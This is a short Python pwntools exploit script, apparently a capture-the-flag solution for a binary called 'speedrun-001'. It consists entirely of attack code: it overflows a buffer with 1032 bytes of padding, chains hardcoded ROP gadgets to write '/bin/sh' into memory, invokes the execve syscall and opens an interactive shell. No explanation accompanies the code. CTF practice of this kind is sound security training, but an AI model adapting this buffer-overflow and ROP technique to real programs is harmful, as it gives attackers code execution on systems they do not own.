from pwn import *
popRax = p64(0x0415664)
popRdi = p64(0x0400686)
popRsi = p64(0x04101f3)
popRdx = p64(0x044be16)
ret = p64(0x0400416)
syscall = p64(0x040129c)
writegdt = p64(0x048d251)

p = process("./speedrun-001")
p.recvuntil(b"Any last words?")

#/bin/sh -> 0x6b6000

rop = b""
rop += popRdx
rop += b"/bin/sh\x00"
rop += popRax
rop += p64(0x6b6000)
rop += writegdt

#syscall
rop += popRax
rop += p64(0x3b)
rop += popRdi
rop += p64(0x6b6000)
rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)
rop += syscall

payload = b"A" * 1032 + rop
p.sendline(payload)
p.interactive()
